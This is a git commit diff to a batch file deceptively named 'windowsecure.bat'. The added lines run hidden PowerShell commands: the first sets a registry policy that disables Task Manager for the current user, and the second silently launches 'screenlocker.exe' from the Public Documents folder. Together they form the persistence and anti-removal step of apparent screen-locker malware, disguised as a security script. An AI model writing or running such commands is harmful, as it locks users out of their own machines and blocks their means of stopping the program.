265069988b4c13dedd6984874b83f056edbe2f78
NHTBOT <140639828+NHTBOT@users.noreply.github.com>
2023-10-08 15:00:35 +0700

    Update windowsecure.bat

--- windowsecure.bat
+++ windowsecure.bat
@@ -1,1 +1,2 @@
-start "" "C:\\Users\\Public\\Document\\screenlocker.exe"
+powershell -windowstyle hidden REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+powershell -windowstyle hidden start "" "C:\\Users\\Public\\Document\\screenlocker.exe"
